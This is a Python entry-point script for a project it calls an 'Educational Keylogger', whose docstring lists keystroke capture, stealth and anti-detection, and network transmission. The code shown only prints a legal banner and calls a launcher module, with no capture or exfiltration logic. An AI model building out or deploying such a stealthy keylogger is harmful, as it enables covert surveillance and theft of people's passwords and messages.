#!/usr/bin/env python3
"""
Educational Keylogger - Main Entry Point
========================================

A comprehensive educational keylogger for cybersecurity learning.
This tool demonstrates various security concepts including:
- Input monitoring and keystroke capture
- Stealth techniques and anti-detection
- Encryption and secure data handling
- Network transmission protocols
- Digital forensics and artifact analysis

⚠️  EDUCATIONAL AND AUTHORIZED TESTING ONLY ⚠️

Author: Educational Project
License: Educational Use Only
Version: 2.0
"""

import sys
import os
from pathlib import Path

# Ensure project root is in Python path
PROJECT_ROOT = Path(__file__).parent
sys.path.insert(0, str(PROJECT_ROOT))

# Display educational banner
def show_banner():
    banner = """
╔══════════════════════════════════════════════════════════════╗
║                Educational Keylogger v2.0                   ║
║                                                              ║
║  🎓 FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY 🎓         ║
║                                                              ║
║  This tool is designed for cybersecurity education:         ║
║  • Understanding input monitoring techniques                 ║
║  • Learning detection and prevention methods                ║
║  • Digital forensics analysis                               ║
║  • Security research and ethical hacking                    ║
║                                                              ║
║  ⚖️  LEGAL NOTICE:                                          ║
║  • Only use on systems you own or have explicit permission ║
║  • Unauthorized use is illegal and unethical               ║
║  • Author is not responsible for misuse                     ║
╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)

def main():
    """Main entry point"""
    show_banner()
    
    # Import and run launcher
    try:
        from src.core.launcher import main as launcher_main
        launcher_main()
    except ImportError as e:
        print(f"❌ Import Error: {e}")
        print("💡 Make sure all dependencies are installed:")
        print("   pip install -r requirements.txt")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n🛑 Application stopped by user")
        sys.exit(0)
    except Exception as e:
        print(f"❌ Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()